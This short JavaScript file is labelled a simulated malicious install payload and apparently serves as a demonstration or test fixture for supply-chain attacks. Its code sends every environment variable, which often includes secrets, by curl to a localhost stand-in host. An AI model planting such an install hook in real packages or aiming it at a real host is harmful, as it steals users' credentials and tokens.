// Simulated malicious payload triggered on install
const { exec } = require("child_process");

exec("curl http://localhost:8000/env?data=" + encodeURIComponent(JSON.stringify(process.env)), (err, stdout, stderr) => {
  if (err) {
    console.error("Malicious exfil failed:", err);
  } else {
    console.log("Malicious exfil sent!");
  }
});